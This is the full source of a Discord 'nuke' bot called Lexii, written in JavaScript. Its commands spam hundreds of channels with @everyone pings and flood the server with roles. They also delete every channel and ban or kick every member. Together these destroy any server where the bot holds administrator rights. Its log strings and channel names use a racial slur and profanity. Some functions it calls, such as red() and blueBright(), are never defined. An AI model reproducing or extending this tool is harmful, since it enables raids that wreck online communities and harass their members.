const Discord = require('discord.js');
const bot = new Discord.Client();

const { prefix, token } = require('./Data/config.json');

bot.on('ready', () => {
    console.log('Bot is online!');
})

bot.on('message', message => {
    let args = message.content.substring(prefix.length).split(" ");

    if (message.content.startsWith(`${prefix}ping`)) {
        message.channel.send('pong').then(m => m.edit(`${m.createdTimestamp - message.createdTimestamp}ms`))
    } else
        if (message.content.startsWith(`${prefix}help`)) {
            let embed = new Discord.MessageEmbed()
                .setTitle('Lexii Help Commands')
                .addField('ping', 'Returns the ping.')
                .addField('massc', 'Creates & Pings new channels.')
                .addField('massroles', 'Flood the server with roles.')
                .addField('dlt', 'deletes channels')
                .addField('banall', 'bans all users in the server.')
                .addField('kickall', 'kicks all users in the server.')
                .addField('credits', 'shows the bot credits.')
                .setFooter('-help for commands')
                .setColor('#36393e')
                .setTimestamp()
            message.channel.send(embed)
        } else
            if (message.content.startsWith(`${prefix}massc`)) {

                if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                    return console.log(red("Nigga... missing perms: ADMINSTRATOR"))
                } else {
                    let args = message.content.split(" ").slice(1);
                    var argresult = args.join(' ');

                    if (!argresult) {
                        for (var i = 0; i < 250; i++) {
                            message.guild.channels.create('Imagine getting fucked')

                            for (var i = 0; i < 250; i++) {
                                let channels = message.guild.channels.create('Get Fucked L')

                                channels.then(
                                    function (channel, index) {
                                        for (var i = 0; i < 250; i++) {
                                            channel.send('@everyone @here ' + argresult)
                                            console.log(`CHANNEL PINGED!`);
                                        }
                                    }
                                );
                            }

                        }

                    }
                    for (var i = 0; i < 250; i++) {
                        let channels = message.guild.channels.create(argresult)

                        channels.then(
                            function (channel, index) {
                                for (var i = 0; i < 250; i++) {
                                    channel.send('@everyone @here ' + argresult);
                                    console.log(blueBright(`CHANNEL PINGED!`));
                                }
                            }
                        );
                    }
                }
                message.delete();
            } else
                if (message.content.startsWith(`${prefix}massroles`)) {
                    if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                        return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
                    } else {
                        setInterval(function () {
                            var i = 0; i < 250;
                            message.guild.roles.create({
                                data: {
                                    name: `${argresult}`,
                                    position: i++,
                                    color: "RANDOM"
                                }
                            }).then(console.log("ROLE BEING MASSED"))
                        }, 100)
                    }
                } else
                if(message.content.startsWith(`${prefix}dlt`)) {
                    if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                        return console.log(red("dummy, missing perms: ADMINSTRATOR"))
                    }
                        else {
                            message.guild.channels.cache.forEach(channel => channel.delete().then(
                                console.log(`CHANNEL FUCKED`)
                            ));
                            message.delete();
                        }
                } else
                if(message.content.startsWith(`${prefix}banall`)) {
                    if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                        return console.log(red("Nigga... perms missing: ADMINSTRATOR"))
                        }
                        else {
                            message.guild.members.cache.forEach(member => member.ban({ reason: "Nuking." })
                                .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banning All Members.")
                                    .catch()
                                ))
                        }
                    } else
                    if(message.content.startsWith(`${prefix}kickall`)) {
                        if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                            return console.log(red("missing perms; ADMINSTRATOR"))
                            }
                            else {
                                message.guild.members.cache.forEach(member => member.kick({ reason: "Nuking." })
                                    .then(console.log(`${member.user.tag} was kicked`) && message.channel.send("Kicked All Members.")
                                        .catch()
                                    ));
                            }
                    } else
                    if(message.content.startsWith(`${prefix}credits`)) {
                        const embed = new Discord.MessageEmbed()
                            .setTitle('Credits')
                            .addField('Bot Creator', 'bot created by 4uapo#6660')
                            .addField('Bot Name', 'Lexii')
                            .addField('Version', '1.1.0')
                            .setColor(0x36393E)
                            .setFooter('- is the prefix')
                        message.channel.send(embed)
                    }
})

bot.login(token)